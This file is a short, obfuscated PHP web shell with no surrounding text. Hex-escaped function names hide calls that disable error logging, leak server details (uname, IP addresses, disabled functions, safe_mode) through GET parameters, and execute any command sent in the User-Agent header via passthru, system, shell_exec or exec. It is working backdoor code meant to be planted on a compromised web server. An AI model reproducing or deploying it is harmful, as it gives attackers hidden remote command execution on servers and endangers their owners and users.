<?php "\x73\x65\x74\x5f\x74\x69\x6d\x65\x5f\x6c\x69\x6d\x69\x74"(0);"\x65\x72\x72\x6f\x72\x5f\x72\x65\x70\x6f\x72\x74\x69\x6e\x67"(0);@"\x69\x6e\x69\x5f\x73\x65\x74"('error_log',NULL);@"\x69\x6e\x69\x5f\x73\x65\x74"('log_errors',0);@"\x69\x6e\x69\x5f\x73\x65\x74"('output_buffering',0);if(isset(${"\x5f\x47\x45\x54"}['disable_functions'])){echo(!empty("\x69\x6e\x69\x5f\x67\x65\x74"('disable_functions'))?"\x69\x6e\x69\x5f\x67\x65\x74"('disable_functions'):'NONE');die();}if(isset(${"\x5f\x47\x45\x54"}['unamea'])){echo php_uname('a');die();}if(isset(${"\x5f\x47\x45\x54"}['server'])){$server_software=(!empty("\x67\x65\x74\x65\x6e\x76"('SERVER_SOFTWARE')))?"\x67\x65\x74\x65\x6e\x76"('SERVER_SOFTWARE'):'';echo $server_software;die();}if(isset(${"\x5f\x47\x45\x54"}['safe_mode'])){$safe_mode=("\x69\x6e\x69\x5f\x67\x65\x74"('safe_mode')==1)?'ON':'OFF';echo $safe_mode;die();}if(isset(${"\x5f\x47\x45\x54"}['server_ip'])){$server_ip=(!empty("\x67\x65\x74\x65\x6e\x76"('SERVER_ADDR')))?"\x67\x65\x74\x65\x6e\x76"('SERVER_ADDR'):'';echo $server_ip;die();}if(isset(${"\x5f\x47\x45\x54"}['client_ip'])){$client_ip=(!empty("\x67\x65\x74\x65\x6e\x76"('REMOTE_ADDR')))?"\x67\x65\x74\x65\x6e\x76"('REMOTE_ADDR'):'';echo $client_ip;die();}if(${"\x5f\x47\x45\x54"}['cmd']=="passthru"){"\x70\x61\x73\x73\x74\x68\x72\x75"($_SERVER['HTTP_USER_AGENT']);}elseif(${"\x5f\x47\x45\x54"}['cmd']=="system"){"\x73\x79\x73\x74\x65\x6d"($_SERVER['HTTP_USER_AGENT']);}elseif(${"\x5f\x47\x45\x54"}['cmd']=="shell_exec"){echo "\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63"($_SERVER['HTTP_USER_AGENT']);}elseif(${"\x5f\x47\x45\x54"}['cmd']=="exec"){echo "\x65\x78\x65\x63"($_SERVER['HTTP_USER_AGENT']);}